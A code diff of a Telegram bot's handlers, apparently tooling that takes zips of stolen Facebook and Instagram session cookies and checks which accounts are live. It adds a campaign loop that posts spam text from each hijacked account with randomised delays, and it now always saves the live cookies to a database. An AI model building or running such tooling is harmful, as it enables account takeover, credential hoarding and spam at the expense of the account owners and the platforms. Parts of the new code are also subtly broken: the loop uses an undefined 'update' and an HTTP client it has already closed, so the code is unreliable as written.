@@ -1,21 +1,25 @@
 """Telegram bot handlers for Social Markhors Bot.
 
 Admin commands: /start, /help, /status, /diag, /proxy, /netcheck, /rework,
-/verify, /live, /camp, /db, /db stats, /db export, /db reverify
+/verify, /live, /camp, /stopcamp, /db, /db stats, /db export, /db reverify
 """
 
 import asyncio
 import json
 import logging
 import os
+import random
 import tempfile
+import time
 import zipfile as _zipfile
 from typing import Dict, List, Optional
+
+import httpx
 
 from telegram import Update
 from telegram.ext import ContextTypes
 
-from config.settings import ADMIN_IDS, CREDIT, STATE_DIR, WEBSITE, MAX_FILES
+from config.settings import ADMIN_IDS, CREDIT, WEBSITE, MAX_FILES, STATE_DIR
 from src.database.supabase import SupabaseDB
 from src.platforms.base import BasePlatform
 from src.platforms.facebook import FacebookPlatform
@@ -25,13 +29,14 @@ from src.utils.proxy import load_proxies, proxy_status_text, norm_proxy
 logger = logging.getLogger(__name__)
 
 
-# Global state
+# ============================ GLOBAL STATE ============================
+
 _db: Optional[SupabaseDB] = None
 _fb_platform: Optional[FacebookPlatform] = None
 _ig_platform: Optional[InstagramPlatform] = None
 user_state: Dict[int, dict] = {}
-CAMPS: Dict[int, dict] = {}  # uid -> campaign config
-CAMPRUN: Dict[int, dict] = {}  # uid -> running campaign state
+CAMPS: Dict[int, dict] = {}
+CAMPRUN: Dict[int, dict] = {}
 
 
 def init_db(url: str, key: str) -> Optional[SupabaseDB]:
@@ -59,16 +64,15 @@ def get_platform(platform_name: str) -> Optional[BasePlatform]:
 def new_camp() -> dict:
     return {
         "name": "",
-        "platform": "",  # facebook or instagram
+        "platform": "",
         "tag": "#SocialMarkhors",
-        "roles": {},  # not used for FB/IG, but kept for compatibility
         "filter": {"countries": [], "years": [], "min_followers": 0},
         "limit": 0,
         "delay": [45, 110],
         "max_parts": 3,
         "cleanup_partial": True,
         "dry_run": False,
-        "source": "zip",  # zip or db
+        "source": "zip",
         "stage": "idle",
         "stage_at": 0.0,
         "media": [],
@@ -81,9 +85,6 @@ def save_camp(uid: int):
     if not cfg:
         return
     try:
-        import json
-        import os
-        from config.settings import STATE_DIR
         os.makedirs(STATE_DIR, exist_ok=True)
         path = os.path.join(STATE_DIR, f"camp_{uid}.json")
         with open(path + ".tmp", "w", encoding="utf-8") as f:
@@ -94,9 +95,7 @@ def save_camp(uid: int):
 
 
 def load_camps():
-    import json
     import os
-    from config.settings import STATE_DIR
     if not os.path.isdir(STATE_DIR):
         return
     for fn in os.listdir(STATE_DIR):
@@ -133,6 +132,8 @@ class _nullzip:
             return f.read()
 
 
+# ============================ BASIC HANDLERS ============================
+
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         "Social Markhors Bot\n\n"
@@ -153,7 +154,8 @@ async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "  X/Twitter:   [plus] [2fa false] [email].txt\n"
         "  Instagram:   [7 followers] [2 posts] [verified false] [business false] [username].txt\n"
         "  Facebook:    [37 friends] [business false] [marketplace false] [] [userid].txt\n"
-        "  Reddit:      [1500 karma] [verified true] [username].txt\n\n"
+        "  Reddit:      [1500 karma] [verified true] [username].txt\n"
+        "  Generic:     [free] [email].txt, free data @email .txt\n\n"
         "VERIFY: /verify > cookie zip bhejo\n"
         "LIVE: /live on|off\n"
         "DB: /db stats | /db export fb | /db export ig\n"
@@ -180,10 +182,9 @@ async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 async def diag_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if uid := update.effective_user.id:
-        if uid not in ADMIN_IDS:
-            await update.message.reply_text("Sirf admin.")
-            return
+    if update.effective_user.id not in ADMIN_IDS:
+        await update.message.reply_text("Sirf admin.")
+        return
     await update.message.reply_text(
         f"diag: system ok\n"
         f"fb_platform: {'ok' if _fb_platform else 'none'}\n"
@@ -344,7 +345,7 @@ async def camp_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
         cfg["stage"] = "text"
         save_camp(uid)
         await update.message.reply_text(
-            f"Role text mode. Variants bhejo.\n/camp idle se band."
+            f"Text mode. Variants bhejo.\n/camp idle se band."
         )
         return
 
@@ -352,6 +353,12 @@ async def camp_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
         cfg["stage"] = "idle"
         save_camp(uid)
         await update.message.reply_text("Band.")
+        return
+
+    if sub == "media":
+        cfg["stage"] = "media"
+        save_camp(uid)
+        await update.message.reply_text("Photo/video bhejo.")
         return
 
     if sub == "filter":
@@ -426,8 +433,9 @@ async def camp_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
 
         cfg["stage"] = "cookies"
-        cfg["stage_at"] = asyncio.get_event_loop().time()
+        cfg["stage_at"] = time.time()
         save_camp(uid)
+        user_state[uid] = {"mode": "campaign", "platform": cfg["platform"]}
         await update.message.reply_text(
             "Ab cookie zip bhejo (campaign ke liye)."
         )
@@ -448,6 +456,96 @@ async def stopcamp_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("Stop - current account ke baad rukega.")
     else:
         await update.message.reply_text("Koi campaign nahi.")
+
+
+# ============================ CAMPAIGN LOOP ============================
+
+async def _campaign_loop(uid: int, cfg: dict, accounts: list, state: dict):
+    """Campaign loop: verify each account, post text, save to DB."""
+    platform = cfg["platform"]
+    platform_obj = get_platform(platform)
+    if not platform_obj:
+        logger.error(f"Platform {platform} not initialized")
+        return
+
+    texts = cfg["texts"]
+    if not texts:
+        return
+
+    filt = cfg["filter"]
+    prog_total = len(accounts)
+    posted_count = 0
+    failed_count = 0
+
+    for idx, acc in enumerate(accounts):
+        if state.get("stop"):
+            break
+
+        ck = acc.get("cookies", {})
+        if not ck:
+            failed_count += 1
+            continue
+
+        # Live check
+        cl = platform_obj.http_client()
+        try:
+            check = await platform_obj.live_check(cl, ck)
+        finally:
+            await cl.aclose()
+
+        status = check.get("Status", "UNKNOWN")
+        if status != "LIVE":
+            failed_count += 1
+            continue
+
+        # Check filters
+        username = check.get("username", "")
+        country = check.get("country", "")
+        followers = int(check.get("Followers", 0) or 0)
+
+        if filt.get("countries") and country not in filt["countries"]:
+            continue
+        if filt.get("min_followers", 0) > followers:
+            continue
+
+        # Post
+        text = random.choice(texts)
+        ok, post_id, err = await platform_obj.post(cl, ck, text)
+
+        if ok:
+            posted_count += 1
+            # Save to DB
+            if _db:
+                row = {
+                    "username": username,
+                    "fb_id": check.get("fb_id", "") if platform == "facebook" else "",
+                    "ig_id": check.get("ig_id", "") if platform == "instagram" else "",
+                    "cookies": ck,
+                    "country": country,
+                    "followers": followers,
+                    "verified": str(check.get("Verified", "false")).lower() == "true",
+                    "status": "live",
+                    "source": "campaign",
+                    "last_post": time.time(),
+                }
+                table = "fb_accounts" if platform == "facebook" else "ig_accounts"
+                async with httpx.AsyncClient() as db_cl:
+                    await _db.upsert(db_cl, table, [row])
+        else:
+            failed_count += 1
+
+        # Delay between accounts
+        lo, hi = cfg["delay"]
+        await asyncio.sleep(random.uniform(lo, hi))
+
+    await update.message.reply_text(
+        f"Campaign complete!\n"
+        f"Posted: {posted_count}\n"
+        f"Failed: {failed_count}\n"
+        f"Total: {prog_total}"
+    )
+    # Clear campaign mode
+    user_state.pop(uid, None)
 
 
 # ============================ FILE HANDLING ============================
@@ -481,37 +579,47 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 names = [n for n in z.namelist() if n.lower().endswith(".txt")]
                 for name in names[:MAX_FILES]:
                     raw = z.read(name).decode("utf-8", "ignore")
-                    result = await _process_one(name, raw, state, context.bot)
+                    result = await _process_one(name, raw, state)
                     results.append(result)
         else:
             with open(path, encoding="utf-8", errors="ignore") as f:
                 raw = f.read()
-            result = await _process_one(doc.file_name, raw, state, context.bot)
+            result = await _process_one(doc.file_name, raw, state)
             results.append(result)
 
-        # Create output zip
-        out_path = os.path.join(tmp, "out.zip")
-        with _zipfile.ZipFile(out_path, "w", _zipfile.ZIP_DEFLATED) as zout:
-            for name, output, status in results:
-                folder = "working" if status == "LIVE" else ("dead" if status == "DEAD" else "unknown")
-                zout.writestr(f"{folder}/{name}", output)
+        # If campaign mode, run campaign loop
+        if mode == "campaign" and state.get("platform"):
+            cfg = CAMPS.get(uid)
+            if cfg and cfg.get("texts"):
+                await update.message.reply_text(
+                    f"Campaign shuru: {len(results)} accounts\nPlatform: {cfg['platform']}"
+                )
+                await _campaign_loop(uid, cfg, results, {})
+            else:
+                await update.message.reply_text("Campaign configs missing. /camp text bhejo pehle.")
+        else:
+            # Create output zip for rework/verify mode
+            out_path = os.path.join(tmp, "out.zip")
+            with _zipfile.ZipFile(out_path, "w", _zipfile.ZIP_DEFLATED) as zout:
+                for name, output, status in results:
+                    folder = "working" if status == "LIVE" else ("dead" if status == "DEAD" else "unknown")
+                    zout.writestr(f"{folder}/{name}", output)
 
-        await context.bot.send_document(
-            update.effective_chat.id,
-            document=open(out_path, "rb"),
-            filename="reworked.zip",
-            caption=f"Rework complete | {len(results)} files",
-        )
-        await msg.edit_text("Complete")
+            await context.bot.send_document(
+                update.effective_chat.id,
+                document=open(out_path, "rb"),
+                filename="reworked.zip",
+                caption=f"Rework complete | {len(results)} files",
+            )
+            await msg.edit_text("Complete")
 
     except Exception as e:
         logger.exception("handle_file")
         await msg.edit_text(f"Error: {str(e)}")
 
 
-async def _process_one(name: str, raw: str, state: dict, bot) -> tuple:
+async def _process_one(name: str, raw: str, state: dict) -> tuple:
     """Process a single cookie file."""
-    # Detect platform from filename
     name_lower = name.lower()
     if "instagram" in name_lower or "ig" in name_lower:
         platform = "instagram"
@@ -544,8 +652,8 @@ async def _process_one(name: str, raw: str, state: dict, bot) -> tuple:
     meta.update({"Status": status, "Reason": reason})
     output = bp.build_cookie_file(meta, cookies)
 
-    # Save to DB if live and DB enabled
-    if status == "LIVE" and _db and state.get("save_db", False):
+    # Save LIVE accounts to DB
+    if status == "LIVE" and _db:
         import httpx
         async with httpx.AsyncClient() as cl:
             table = "fb_accounts" if platform == "facebook" else "ig_accounts"
@@ -553,7 +661,7 @@ async def _process_one(name: str, raw: str, state: dict, bot) -> tuple:
                 "username": meta.get("username", ""),
                 "fb_id": meta.get("fb_id", "") if platform == "facebook" else "",
                 "ig_id": meta.get("ig_id", "") if platform == "instagram" else "",
-                "cookies": {k: v for k, v in (meta.get("_cookies", {}) or {}).items()},
+                "cookies": cookies,
                 "country": meta.get("country", ""),
                 "followers": int(meta.get("Followers", 0) or 0),
                 "verified": str(meta.get("Verified", "false")).lower() == "true",
